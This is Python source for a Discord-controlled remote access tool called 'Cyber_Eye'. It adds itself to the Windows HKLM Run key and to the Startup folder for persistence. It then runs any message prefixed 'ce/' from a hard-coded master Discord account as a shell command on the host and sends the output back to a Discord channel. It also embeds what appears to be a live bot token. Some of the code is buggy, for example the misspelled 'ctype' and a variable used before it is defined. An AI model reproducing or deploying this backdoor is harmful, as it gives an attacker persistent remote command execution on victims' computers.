import discord

import subprocess
import time
import os
import sys
import shutil
import ctypes
import winreg
import getpass


client = discord.Client()
MASTER = 441865412804870144


def is_running_as_admin():

    try:
        return ctype.windll.shell32.IsUserAnAdmin()
    except:
        return False

def execute():
    if not is_running_as_admin():
        print("管理者権限での操作が確認できなかったため、操作を中断しました。")
        time.sleep(5)
        sys.exit()
        
    else:
        print("管理者との確認が取れました。セットアップを開始します。")

    execute()
        

USERNAME = getpass.getuser()
PATH = "SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
FILE_PATH = os.path.abspath("./Cyber_Eye.py")
KEY = winreg.OpenKeyEx(winreg.HKEY_LOCAL_MACHINE, PATH, access=winreg.KEY_WRITE)

winreg.SetValueEx(KEY, 'CyberEye', 0, winreg.REG_SZ, FILE_PATH)
winreg.CloseKey(KEY)

shutil.copyfile(FILE_PATH, f"C:/Users/{USERNAME}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup")


@client.event
async def on_ready():
    channel = client.get_channel(791952226225750017)
    
    await channel.send(f"{client.user.name} is ready.")
    await channel.send("Hi, Master.")
    

@client.event
async def on_message(message):
    if message.author.bot:
        return

    if message.content.startswith("ce/"):
        if message.author.id == MASTER:

            cmd = message.content.strip("ce/")

            process = subprocess.getoutput(str(cmd))
            msg = f"コマンドの実行: {message.author.name}\n ``{process}``"

            if len(msg) > 2000:
                with open("./OverLen.txt", "w", encoding="utf-8") as OLF:
                    OLF.write(msg)
                    OLF.close()

                    await message.channel.send(file=discord.File("./OverLen.txt"))
                    os.remove("./OverLen.txt")
                    
        else:
            
            await message.channel.send(msg)



client.run("NzkxOTQ3NzgwNDU3MTAzMzky.X-Wk2A.qurX71U3KPEFihgzlXye6tXG51Q")
